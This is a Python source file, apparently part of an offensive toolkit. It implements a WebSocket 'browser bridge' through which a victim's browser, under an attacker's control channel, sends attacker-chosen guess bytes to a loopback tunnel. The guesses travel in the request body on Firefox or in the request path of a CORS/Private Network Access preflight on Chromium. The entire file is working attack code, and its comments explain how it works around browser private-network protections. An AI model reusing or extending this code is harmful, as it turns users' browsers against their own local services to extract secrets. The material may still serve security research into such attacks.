"""Async bridge between the browser-injection adapter and the WebSocket
control channel served by the attacker.

The victim's browser connects via WebSocket and executes fetch() commands
on behalf of the attacker.
"""

from __future__ import annotations

import asyncio
import base64
import logging
from typing import Any

LOG = logging.getLogger("attack.browser_bridge")


class BrowserBridge:
    def __init__(self) -> None:
        self._ws: Any = None
        self._pending: dict[int, asyncio.Future] = {}
        self._next_id = 0
        self._ready = asyncio.Event()

    @property
    def connected(self) -> bool:
        return self._ws is not None and not self._ws.closed

    def set_ws(self, ws: Any) -> None:
        self._ws = ws
        self._ready.set()

    def clear_ws(self) -> None:
        self._ws = None
        self._ready.clear()
        for fut in self._pending.values():
            if not fut.done():
                fut.cancel()
        self._pending.clear()

    async def wait_ready(self, timeout: float = 120) -> None:
        await asyncio.wait_for(self._ready.wait(), timeout=timeout)

    async def _dispatch(self, message: dict) -> dict:
        """Send *message* (with a fresh ``id``) to the browser and block until
        it echoes ``{"cmd": "done", "id": ...}``, returning that done payload.
        Shared by ``inject`` (body vehicle, Firefox) and ``inject_preflight``
        (URL-path vehicle, PNA Chromium)."""
        if not self.connected:
            raise RuntimeError("browser not connected")
        msg_id = self._next_id
        self._next_id += 1
        fut = asyncio.get_running_loop().create_future()
        self._pending[msg_id] = fut
        await self._ws.send_json({**message, "id": msg_id})
        try:
            return await asyncio.wait_for(fut, timeout=30)
        finally:
            self._pending.pop(msg_id, None)

    async def inject(self, data: bytes) -> None:
        """Tell the browser to POST *data* to the tunnel and wait.

        Body vehicle: the guess rides in the sendBeacon/fetch request *body*
        (Firefox, which does not preflight the cross-origin public->loopback
        request under PNA).
        """
        await self._dispatch({
            "cmd": "fetch",
            "body": base64.b64encode(data).decode("ascii"),
        })

    async def inject_preflight(
        self, path: bytes, headers: dict | None = None,
    ) -> dict:
        """Tell the browser to issue a fetch() that provokes a real CORS/PNA
        OPTIONS preflight whose request-URI *path* carries the guess, and wait
        until the preflight has been sent.

        URL-path vehicle: under enforced Private Network Access a
        Chromium-class browser answers the cross-origin private->loopback
        request with an OPTIONS preflight that strips the body, so the guess
        cannot ride in the body. It rides in ``path`` instead. ``path`` is the
        already-assembled ``prefill | anchor | candidate | alignment`` byte
        string; every byte is URL-path-safe ASCII (see
        attacker/attack/adapters/browser_pna.py), so latin-1 round-trips it
        losslessly. The page resolves this call in a ``.finally()`` after the
        (expected) rejection, by which point the preflight bytes are already on
        the wire.

        Returns the browser's done payload, including ``rejected`` (the fetch
        was blocked -- evidence a preflight was sent and denied) and ``error``.
        """
        return await self._dispatch({
            "cmd": "preflight",
            "path": path.decode("latin-1"),
            "headers": headers or {},
        })

    def on_message(self, data: dict) -> None:
        cmd = data.get("cmd")
        if cmd == "done":
            msg_id = data.get("id")
            fut = self._pending.get(msg_id)
            if fut and not fut.done():
                # Resolve with the full done payload so callers (e.g. the PNA
                # probe) can read `rejected` / `error`. inject() ignores it.
                fut.set_result(data)
        elif cmd == "ready":
            LOG.info("browser reported ready")
